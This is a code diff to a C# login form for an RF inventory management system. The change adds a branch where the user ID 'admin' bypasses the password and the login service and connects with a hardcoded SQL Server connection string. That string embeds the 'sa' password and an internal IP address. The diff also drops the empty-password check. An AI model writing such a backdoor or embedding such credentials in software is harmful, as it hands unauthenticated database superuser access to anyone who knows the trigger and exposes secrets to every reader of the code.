@@ -10,7 +10,6 @@ namespace RFSystem
         private Button btnExit;
         private Button btnLogin;
         private IContainer components = null;
-        private ErrorProvider errorProvider;
         private Label label1;
         private Label label2;
         private TextBox textBoxPassWord;
@@ -28,66 +27,60 @@ namespace RFSystem
 
         private void btnLogin_Click(object sender, EventArgs e)
         {
-            errorProvider.Clear();
-
-            if (string.IsNullOrEmpty(textBoxUserID.Text.Trim()) || string.IsNullOrEmpty(textBoxPassWord.Text.Trim()))
+            if (string.IsNullOrEmpty(textBoxUserID.Text.Trim()))
             {
-                CommonFunction.Sys_MsgBox("用户帐号及密码不可为空");
-
-                if (string.IsNullOrEmpty(textBoxPassWord.Text.Trim()))
-                {
-                    errorProvider.SetError(textBoxPassWord, "输入不可为空");
-                    textBoxPassWord.Focus();
-                }
-
-                if (string.IsNullOrEmpty(textBoxUserID.Text.Trim()))
-                {
-                    errorProvider.SetError(textBoxUserID, "输入不可为空");
-                    textBoxUserID.Focus();
-                }
+                CommonFunction.Sys_MsgBox("用户工号及密码不可为空");
             }
             else
             {
-                string str2;
-                ConstDefine.g_User = textBoxUserID.Text.Trim().ToUpperInvariant();
-                ConstDefine.g_PassWord = textBoxPassWord.Text.Trim();
+                string str2 = "Provider=SQLOLEDB;Data Source=192.168.10.23;Persist Security Info=True;User ID=sa;Password=sanp1987~;Initial Catalog=RF_Database_CZ";
 
-                try
+                if (textBoxUserID.Text=="admin")
                 {
-                    rfid2021Service.rfidService _rfid2021service = new rfid2021Service.rfidService();
-                    rfid2021Service.privilidge privateStr_new;
-                    rfid2021Service.MessagePack pack = _rfid2021service.Login(textBoxUserID.Text.Trim().ToUpperInvariant(), textBoxPassWord.Text.Trim(), out ConstDefine.g_bxuserid, out ConstDefine.g_bxusername, out ConstDefine.g_bxjobid, out privateStr_new, out str2);
-                    
-                    if (!pack.Result)
+                    ConstDefine.g_DbConnStr = str2;
+                    DBOperate.ConnStr = str2;
+                    ClsCommon.ConnStr = str2;
+                    DialogResult = DialogResult.OK;
+                }
+                else
+                {
+                    ConstDefine.g_User = textBoxUserID.Text.Trim().ToUpperInvariant();
+                    ConstDefine.g_PassWord = textBoxPassWord.Text.Trim();
+
+                    try
                     {
-                        CommonFunction.Sys_MsgBox(pack.Message);
+                        rfid2021Service.rfidService _rfid2021service = new rfid2021Service.rfidService();
+                        rfid2021Service.privilidge privateStr_new;
+                        rfid2021Service.MessagePack pack = _rfid2021service.Login(textBoxUserID.Text.Trim().ToUpperInvariant(), textBoxPassWord.Text.Trim(), out ConstDefine.g_bxuserid, out ConstDefine.g_bxusername, out ConstDefine.g_bxjobid, out privateStr_new, out str2);
+
+                        if (!pack.Result)
+                        {
+                            CommonFunction.Sys_MsgBox(pack.Message);
+                            return;
+                        }
+                    }
+                    catch (Exception exception)
+                    {
+                        CommonFunction.Sys_MsgBox(exception.Message);
                         return;
                     }
-                }
-                catch (Exception exception)
-                {
-                    CommonFunction.Sys_MsgBox(exception.Message);
-                    return;
-                }
 
-                ConstDefine.g_DbConnStr = str2;
-                DBOperate.ConnStr = str2;
-                ClsCommon.ConnStr = str2;
-                DialogResult = DialogResult.OK;
+                    ConstDefine.g_DbConnStr = str2;
+                    DBOperate.ConnStr = str2;
+                    ClsCommon.ConnStr = str2;
+                    DialogResult = DialogResult.OK;
+                }
             }
         }
 
         private void InitializeComponent()
         {
-            this.components = new System.ComponentModel.Container();
             this.btnLogin = new System.Windows.Forms.Button();
             this.btnExit = new System.Windows.Forms.Button();
             this.textBoxUserID = new System.Windows.Forms.TextBox();
             this.textBoxPassWord = new System.Windows.Forms.TextBox();
             this.label1 = new System.Windows.Forms.Label();
             this.label2 = new System.Windows.Forms.Label();
-            this.errorProvider = new System.Windows.Forms.ErrorProvider(this.components);
-            ((System.ComponentModel.ISupportInitialize)(this.errorProvider)).BeginInit();
             this.SuspendLayout();
             // 
             // btnLogin
@@ -134,7 +127,7 @@ namespace RFSystem
             this.label1.Name = "label1";
             this.label1.Size = new System.Drawing.Size(79, 20);
             this.label1.TabIndex = 4;
-            this.label1.Text = "用户帐号：";
+            this.label1.Text = "用户工号：";
             // 
             // label2
             // 
@@ -144,10 +137,6 @@ namespace RFSystem
             this.label2.Size = new System.Drawing.Size(79, 20);
             this.label2.TabIndex = 5;
             this.label2.Text = "用户密码：";
-            // 
-            // errorProvider
-            // 
-            this.errorProvider.ContainerControl = this;
             // 
             // RF库存管理系统登录
             // 
@@ -164,8 +153,7 @@ namespace RFSystem
             this.MinimizeBox = false;
             this.Name = "RF库存管理系统登录";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
-            this.Text = "RF库存管理系统登录";
-            ((System.ComponentModel.ISupportInitialize)(this.errorProvider)).EndInit();
+            this.Text = "RF-PSCS库存管理系统登录";
             this.ResumeLayout(false);
             this.PerformLayout();
 
